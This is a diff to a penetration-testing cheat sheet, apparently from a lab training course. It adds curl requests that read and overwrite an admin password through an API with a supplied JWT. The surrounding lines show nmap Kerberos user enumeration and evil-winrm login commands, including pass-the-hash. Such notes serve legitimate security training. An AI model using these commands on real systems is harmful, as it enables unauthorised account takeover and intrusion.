@@ -254,6 +254,24 @@ sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.r
 ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 
+## curl
+```bash
+GET Request
+curl -i http://192.168.50.16:5002/users/v1/admin/password
+
+POST Request
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+PUT Request
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+
+```
+
+
 # evil-winrm
 evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
 evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -H ''
